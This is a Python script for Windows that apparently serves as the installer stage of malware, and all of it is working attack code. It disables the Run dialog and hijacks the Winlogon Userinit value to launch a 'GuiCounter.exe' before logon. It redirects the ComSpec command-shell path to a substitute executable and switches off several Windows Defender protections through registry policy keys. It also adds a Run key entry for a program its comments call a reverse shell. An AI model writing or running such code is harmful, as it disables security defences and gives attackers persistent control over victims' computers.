#!/usr/bin/python
#coding:utf-8
import os, sys, time, winreg
# ENVIRONMENT VARIABLE
usr = os.environ["USERNAME"]
d = os.environ["SystemDrive"]
# WRITE A REG FOR BLOCK WIN + R Execution
def noRun():
    norun = "REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f"
    os.system(norun)
# FUNCTION TO DELETE USERINIT IN WINDOWS REGISTRY
def delInit():
    delc = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /f'
    os.system(delc)
# WRITE A REG FOR THE GUI COUNTER TO STARTUP BEFORE LOGON ON WINDOWS
def setInit():
    p = "{}\\Users\\{}\\AppData\\gui_counter\\GuiCounter.exe, {}\\Windows\\system32\\userinit.exe".format(d, usr, d)
    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
    winreg.SetValueEx(key, 'Userinit',0, winreg.REG_SZ, p)
    winreg.CloseKey(key)
# DELETE CMD KEY FOR NEW REGISTRY
def delcmd():
    delc = 'REG DELETE "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment" /v ComSpec /f'
    os.system(delc)
# SET NEW KEY FOR NEW CMD PATH DIRECTORY
def setCmd():
    sr = "%SystemRoot%"
    p = "{}\\windows\\system\\c.exe".format(sr)
    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'System\\CurrentControlSet\\Control\\Session Manager\\Environment')
    winreg.SetValueEx(key, 'ComSpec',0, winreg.REG_EXPAND_SZ, p)
    winreg.CloseKey(key)
# DISABLE WINDOWS DEFENDER ANTI SPYWARE
def spy():
    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
    os.system(dwin)
# DISABLE WINDOWS DEFENDER SCAN REAL TIME PROTECTION
def scanRtime():
    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f'
    os.system(dwin)
# DISABLE WINDOWS DEFENDER BEHAVIOR MONITORING
def bMonitor():
    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'
    os.system(dwin)
# DISABLE WINDOWS DEFENDER ACCESS
def onAccess():
    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'
    os.system(dwin)
#####################################################################
# WRITE A REG FOR THE REVERSE SHELL IN THE REGISTER (NOT IMPLEMENTED)
def setRv():
    p = "\\Users\\%s\\AppData\\gui_counter\\rvMs32\\rvMs32.exe" %(usr)
    c = "{}{}".format(d, p)
    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.SetValueEx(key, 'rvMs',0, winreg.REG_SZ, c)
    winreg.CloseKey(key)
